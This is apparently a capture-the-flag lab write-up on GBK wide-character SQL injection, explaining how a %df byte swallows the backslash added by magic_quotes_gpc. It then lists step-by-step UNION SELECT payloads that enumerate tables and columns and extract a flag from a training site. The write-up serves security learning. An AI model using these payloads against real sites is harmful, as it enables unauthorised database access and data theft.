# Lab 6.3.2 SQL Wide-Char-Based Injection

## 0x00 Basic Knowledge

Lots of non-English countries are using different charset besides unicode (utf-8). For example, in China, gbk is still very popular among some CMS or sites. 

However, different charset may need different number of bytes to store them.

- utf8 3 bytes
- gbk 2 bytes

### Issue Causes

So when some sites using different charsets for backend and database, for example PHP (utf-8) and MySQL (gbk), some vulnerabilities may occur for wide char injection.

```sql
SET NAMES 'gbk'
```

which inculdes the following

```sql
SET character_set_client = gbk;
SET character_set_results = gbk;
SET character_set_connection = gbk;
```

### magic_quotes_gpc

When magic_quotes_gpc is ON, it may add "\" in front of most of the special characters

- '
- "
- \
- NULL

for all POST, GET, COOKIE etc input variables.

### Injection

In order to bypass additional \, we need to inject more payload to remove that backslash.

In gbk, \ is represent as %5c and 'ÈÅã' is %df%5c, we can add addition %df to eliminate the backslash.

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### [Home Page][2]

![](./imgs/0_home.jpg)

### Injection Point

```sql
id=1'%23
```

![](./imgs/1_bs.jpg)

```sql
id=1%df' %23
```

![](./imgs/1_df.jpg)

So we got an unknown char here.

### Field Number

```sql
id=1%df' ORDER BY 1,2,3%23
```

![](./imgs/2_field_num.jpg)

Works with 1,2,3 not 4. So only 3 fields are needed.

### Display Location

```sql
id=1.111%df' UNION SELECT 1,2,3%23
```

![](./imgs/3_display.jpg)

### VERSION

```sql
id=1.111%df' UNION SELECT 1,2,VERSION()%23
```

![](./imgs/4_version.jpg)

### TABLE_NAME

```sql
id=1.111%df' UNION SELECT 1,2,GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()%23
```

![](./imgs/5_table_name.jpg)

| OFFSET | TABLE_NAME   |
| ------ | ------------ |
| 0      | emails       |
| 1      | referers     |
| 2      | uagents      |
| 3      | users        |
| 4      | zkaq         |

### CLOUMN_NAME

```sql
id=1.111%df' UNION SELECT 1,2,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq'%23
```

![](./imgs/5_col_err.jpg)

Some backslashes are also added here. So need to try in [HEX][3].

![](./imgs/hex.jpg)

```sql
id=1.111%df' UNION SELECT 1,2,GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7a6b6171%23
```

![](./imgs/6_column_name.jpg)

| OFFSET | COLUMN_NAME  |
| ------ | ------------ |
| 0      | flag         |
| 1      | zKaQ         |

### FLAG

```sql
id=1.111%df' UNION SELECT 1,flag,zKaQ FROM zkaq WHERE flag=8%23
```

![](./imgs/7_flag.jpg)

**FLAG** = **zKaQ-adds1ash4s**

[1]: https://hack.zkaq.org/?a=battle&f=target&id=7504b0481a4efc6f
[2]: http://120.203.13.75:8150/New/WidecharBased/RankTwo/sql-two/
[3]: https://codebeautify.org/string-hex-converter